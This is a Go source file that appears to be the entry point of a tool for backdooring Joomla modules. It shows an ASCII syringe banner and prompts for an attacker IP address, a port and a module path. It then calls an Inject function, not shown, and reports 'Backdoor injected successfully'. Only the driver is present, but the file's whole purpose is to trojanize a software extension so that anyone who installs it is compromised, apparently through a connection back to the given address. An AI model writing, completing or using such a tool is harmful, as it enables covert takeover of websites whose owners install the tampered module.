package main

import (
    "fmt"

    "data"
    "internals"
    "utils"
)

var banner string = `
.     |___________________________________
|-----|- - -|''''|''''|''''|''''|''''|'##\|__
|- -  |  cc 6    5    4    3    2    1 ### __]==----------------------
|-----|________________________________##/|
'     |"""""""""""""""""""""""""""""""""""
`

func main() {
    var port uint16
    var ip string
    var modulePath string

    utils.Print(data.Green, banner)

    utils.Print(data.Blue, "[+] Type your ip address => ")
    fmt.Scan(&ip)

    utils.Print(data.Blue, "[+] Type your port => ")
    fmt.Scan(&port)

    utils.Print(data.Blue, "[+] Type the path to your decompressed Joomla module => ")
    fmt.Scan(&modulePath)

    err := internals.Inject(ip, port, modulePath)
    if err != nil {
        utils.Print(data.Red, "[-] Error injecting backdoor")
    } else {
        utils.Print(data.Green, "[+] Backdoor injected successfully")
    }
}